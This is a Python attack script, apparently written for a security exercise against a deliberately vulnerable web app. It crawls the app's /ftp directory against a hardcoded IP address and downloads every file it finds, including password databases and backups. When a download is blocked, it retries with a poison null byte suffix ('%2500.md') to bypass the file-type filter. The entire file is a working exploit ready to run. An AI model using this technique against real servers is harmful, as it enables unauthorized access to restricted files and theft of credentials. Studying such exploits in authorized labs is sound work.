import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import os
import re

# Helped by CHATGPT to recursively download all files and content in directory /ftp
# the /ftp directory was discovered thanks to the URL Crawler (SiteCrawler.py)
# ->(that i will include in the attacks even thought it isn't an OWASP vulnerability)


class FTPDownloader:
    def __init__(self, base_url: str):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.trust_env = False
        self.session.proxies = {'http': None, 'https': None}
        self.discovered_files = set()
        self.visited_dirs = set()
        self.base_download_folder = os.path.join('files', 'ftp_downloads')
        os.makedirs(self.base_download_folder, exist_ok=True)
        
    def get_relative_path(self, url: str) -> str:
        path = urlparse(url).path
        if path.startswith('/ftp/'):
            return path[5:]  # Remove /ftp/ prefix
        return path

    def download_ftp_content(self, path="/ftp/"):
        if path in self.visited_dirs:
            return
        
        self.visited_dirs.add(path)
        url = urljoin(self.base_url, path)
        print(f"[*] Exploring {url}")
        
        try:
            response = self.session.get(url, timeout=10)
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                
                for link in soup.find_all(['a', 'link'], href=True):
                    href = link['href'].strip()
                    if href in ['.', '..', '#', './']:
                        continue
                    
                    full_url = urljoin(url, href)
                    if not self.is_internal_url(full_url):
                        continue

                    if href.endswith('/') or not '.' in href.split('/')[-1]:
                        new_path = urljoin(path, href)
                        self.download_ftp_content(new_path)
                    else:
                        self.download_file(full_url)
                
                self.extract_file_paths(response.text, url)
                
        except Exception as e:
            print(f"[!] Error accessing {url}: {e}")
    
    def extract_file_paths(self, content: str, base_url: str):
        patterns = [
            r'href=[\'"]([^"\']+\.(?:md|pdf|txt|json|xml|kdbx|bak))[\'"]',
            r'src=[\'"]([^"\']+\.(?:md|pdf|txt|json|xml|kdbx|bak))[\'"]',
            r'url\([\'"]?([^\'"\)]+\.(?:md|pdf|txt|json|xml|kdbx|bak))[\'"]?\)',
            r'>[^<]+\.(?:md|pdf|txt|json|xml|kdbx|bak)<',
        ]
        
        for pattern in patterns:
            for match in re.finditer(pattern, content):
                file_path = match.group(1) if not '>' in match.group(0) else match.group(0)[1:-1]
                file_url = urljoin(base_url, file_path)
                if self.is_internal_url(file_url):
                    self.download_file(file_url)
    
    def download_file(self, url: str):
        if url in self.discovered_files:
            return
            
        self.discovered_files.add(url)
        rel_path = self.get_relative_path(url)
        if rel_path:
            save_dir = os.path.join(self.base_download_folder, os.path.dirname(rel_path))
            os.makedirs(save_dir, exist_ok=True)
            save_path = os.path.join(save_dir, os.path.basename(url))
        else:
            save_path = os.path.join(self.base_download_folder, os.path.basename(url))
        
        print(f"[*] Attempting to download: {url}")
        
        if self._try_download(url, save_path):
            return
            
        poisoned_url = f"{url}%2500.md"
        if self._try_download(poisoned_url, save_path):
            return
            
        print(f"[!] Failed to download {url}")
    
    def _try_download(self, url: str, save_path: str) -> bool:
        try:
            response = self.session.get(url, timeout=10)
            if response.status_code == 200:
                with open(save_path, 'wb') as f:
                    f.write(response.content)
                print(f"[+] Downloaded: {save_path}")
                return True
        except Exception as e:
            print(f"[!] Error downloading {url}: {e}")
        return False
    
    def is_internal_url(self, url: str) -> bool:
        return urlparse(self.base_url).netloc == urlparse(url).netloc

    def run(self):
        print(f"[+] Starting download to: {self.base_download_folder}")
        self.download_ftp_content()
        print(f"[+] Download complete. Total files: {len(self.discovered_files)}")

if __name__ == "__main__":
    base_url = "http://45.76.47.218:3000"
    downloader = FTPDownloader(base_url)
    downloader.run()